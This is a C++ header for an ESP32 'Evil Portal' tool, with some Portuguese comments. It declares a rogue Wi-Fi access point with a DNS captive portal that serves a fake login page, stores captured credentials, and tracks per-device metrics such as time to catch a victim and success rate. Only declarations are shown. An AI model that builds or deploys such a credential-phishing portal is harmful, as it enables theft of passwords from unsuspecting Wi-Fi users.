#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <vector>
#include <set>
#include <map>
#include "config.h"

// Estrutura para rastrear tempo de captura por MAC
struct ClientStats {
    uint32_t firstSeen;
    uint32_t capturedAt;
    uint32_t lastActive;
    bool captured;
    bool disconnected;
};

// Evil Portal Manager class
class EvilPortalManager {
public:
    EvilPortalManager();
    ~EvilPortalManager();
    
    // Initialization
    bool begin(const char* ssid = PORTAL_AP_NAME, uint8_t channel = PORTAL_CHANNEL);
    void end();
    
    // Server management
    void startAP();
    void stopAP();
    void setupRoutes();
    void loop();
    
    // Credential management
    int getCapturedCredsCount();
    String getLastCredential();
    const std::vector<String>& getCapturedCreds() const { return capturedCreds; }
    void clearCredentials();
    
    // Status & Metrics
    bool isActive();
    int getClientCount();
    int getTotalUniqueCount();
    float getSuccessRate();
    uint32_t getUptimeSeconds();
    float getAvgTimeToCatch(); // TTC
    float getAvgTimeToReject(); // TTR
    float getAvgTimeToLeft();   // TTL
    float getMemoryUsagePct();  // MEM
    int8_t getRSSI();
    
private:
    AsyncWebServer* webServer;
    DNSServer* dnsServer;
    
    String apName;
    uint8_t apChannel;
    bool active;
    uint32_t startTime;
    
    // Captured credentials
    std::vector<String> capturedCreds;
    String lastCred;
    int totalCaptured;
    
    // Métricas avançadas
    std::set<String> uniqueMacs;
    std::map<String, ClientStats> clientMetrics;
    
    // Acumuladores para médias
    uint32_t totalTTC;
    int ttcCount;
    uint32_t totalTTR;
    int ttrCount;
    uint32_t totalTTL;
    int ttlCount;
    
    // HTML pages
    String htmlPage;
    
    // Request handlers
    void handleRoot(AsyncWebServerRequest* request);
    void handlePost(AsyncWebServerRequest* request);
    void handleNotFound(AsyncWebServerRequest* request);
    
    // HTML generators
    String getDefaultHTML();
    String getSuccessHTML();
    
    // DNS captive portal
    void setupDNS();
    
    // Helpers
    void updateClientMetrics();
};

// Global instance
extern EvilPortalManager evilPortal;

// Default HTML template
extern const char PORTAL_HTML[] PROGMEM;

#endif // EVIL_PORTAL_H
